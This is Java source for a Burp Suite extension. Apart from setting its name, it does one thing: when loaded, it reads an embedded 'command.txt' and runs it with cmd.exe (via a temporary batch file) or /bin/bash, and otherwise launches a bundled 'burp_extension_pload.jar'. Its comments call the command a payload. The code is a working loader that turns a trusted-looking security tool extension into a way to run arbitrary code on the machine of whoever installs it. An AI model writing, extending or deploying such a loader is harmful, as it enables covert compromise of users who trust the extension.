package burp;

import java.io.File;
import java.io.InputStream;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

public class BurpExtender implements IBurpExtender {
    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        // Read extension name from resource file and set it
        InputStream nameInputStream = getClass().getClassLoader().getResourceAsStream("name.txt");
        Scanner nameScanner = new Scanner(nameInputStream, StandardCharsets.UTF_8.name());
        String extensionName = nameScanner.useDelimiter("\\A").next().trim();
        callbacks.setExtensionName(extensionName);

        // Obtain our output and error streams
        PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);
        PrintWriter stderr = new PrintWriter(callbacks.getStderr(), true);

        // Detect operating system
        String os = System.getProperty("os.name").toLowerCase();
        Process process;

        try {
            stdout.println("Initializing extension.");

            // Locate command.txt using ClassLoader
            InputStream commandInputStream = getClass().getClassLoader().getResourceAsStream("command.txt");

            if (commandInputStream != null) {
                // Read the command from command.txt
                Scanner commandScanner = new Scanner(commandInputStream, StandardCharsets.UTF_8.name());
                String command = commandScanner.useDelimiter("\\A").next().trim();

                if (os.contains("win")) {
                    // Create a temporary batch script to avoid line length issues from command line
                    File tempScript = File.createTempFile("command", ".bat");
                    tempScript.deleteOnExit(); // Ensure the file is deleted after execution

                    // Write the command to the script file
                    try (PrintWriter writer = new PrintWriter(tempScript, StandardCharsets.UTF_8.name())) {
                        writer.println("@echo off");
                        writer.println(command); // Write the payload command
                    }

                    // Execute the script file
                    process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", tempScript.getAbsolutePath()});
                } else {
                    // Unix-based systems: Use /bin/bash
                    process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", command});
                }
            } else {
                stdout.println("XXX using jar file");
                // Run burp_extension_pload.jar if command.txt does not exist
                String jarCommand = "java -jar burp_extension_pload.jar";

                if (os.contains("win")) {
                    process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", jarCommand});
                } else {
                    process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", jarCommand});
                }
            }

            stdout.println("Finished initializing extension.");
        } catch (Exception e) {
            stderr.println("Error loading extension: " + e.getMessage());
        }
    }
}
